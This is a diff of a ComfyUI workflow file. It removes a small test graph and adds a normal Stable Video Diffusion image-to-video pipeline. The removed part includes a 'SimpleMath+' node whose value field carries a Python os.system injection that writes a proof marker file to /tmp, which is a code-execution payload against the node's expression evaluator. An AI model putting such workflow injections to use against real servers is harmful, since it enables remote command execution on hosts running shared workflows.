@@ -1,31 +1,133 @@
 {
-  "1": {
-    "class_type": "EmptyImage",
+  "3": {
     "inputs": {
-      "width": 8,
-      "height": 8,
-      "batch_size": 1,
-      "color": 0
-    }
-  },
-  "2": {
-    "class_type": "SaveImage",
-    "inputs": {
-      "images": [
-        "1",
+      "seed": 237514639057514,
+      "steps": 20,
+      "cfg": 2.5,
+      "sampler_name": "euler",
+      "scheduler": "karras",
+      "denoise": 1.0,
+      "model": [
+        "14",
         0
       ],
-      "filename_prefix": "f"
+      "positive": [
+        "12",
+        0
+      ],
+      "negative": [
+        "12",
+        1
+      ],
+      "latent_image": [
+        "12",
+        2
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "KSampler"
     }
   },
-  "3": {
-    "class_type": "SimpleMath+",
+  "8": {
     "inputs": {
-      "value": "__import__(\"os\").system(\"echo PROOF_202_91_45_198_1781885089 > /tmp/PROOF_202_91_45_198_1781885089.txt\") or 1",
-      "a": [
-        "1",
+      "samples": [
+        "3",
+        0
+      ],
+      "vae": [
+        "15",
+        2
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAE Decode"
+    }
+  },
+  "12": {
+    "inputs": {
+      "width": 1024,
+      "height": 576,
+      "video_frames": 14,
+      "motion_bucket_id": 127,
+      "fps": 6,
+      "augmentation_level": 0.01,
+      "clip_vision": [
+        "15",
+        1
+      ],
+      "init_image": [
+        "23",
+        0
+      ],
+      "vae": [
+        "15",
+        2
+      ]
+    },
+    "class_type": "SVD_img2vid_Conditioning",
+    "_meta": {
+      "title": "SVD_img2vid_Conditioning"
+    }
+  },
+  "14": {
+    "inputs": {
+      "min_cfg": 1.0,
+      "model": [
+        "15",
         0
       ]
+    },
+    "class_type": "VideoLinearCFGGuidance",
+    "_meta": {
+      "title": "VideoLinearCFGGuidance"
+    }
+  },
+  "15": {
+    "inputs": {
+      "ckpt_name": "svd.safetensors"
+    },
+    "class_type": "ImageOnlyCheckpointLoader",
+    "_meta": {
+      "title": "Image Only Checkpoint Loader (img2vid model)"
+    }
+  },
+  "23": {
+    "inputs": {
+      "image": "ComfyUI_00015_ (1).png"
+    },
+    "class_type": "LoadImage",
+    "_meta": {
+      "title": "Load Image"
+    }
+  },
+  "25": {
+    "inputs": {
+      "fps": 10.0,
+      "images": [
+        "8",
+        0
+      ]
+    },
+    "class_type": "CreateVideo",
+    "_meta": {
+      "title": "Create Video"
+    }
+  },
+  "26": {
+    "inputs": {
+      "filename_prefix": "video/ComfyUI",
+      "format": "auto",
+      "codec": "auto",
+      "video": [
+        "25",
+        0
+      ]
+    },
+    "class_type": "SaveVideo",
+    "_meta": {
+      "title": "Save Video"
     }
   }
 }
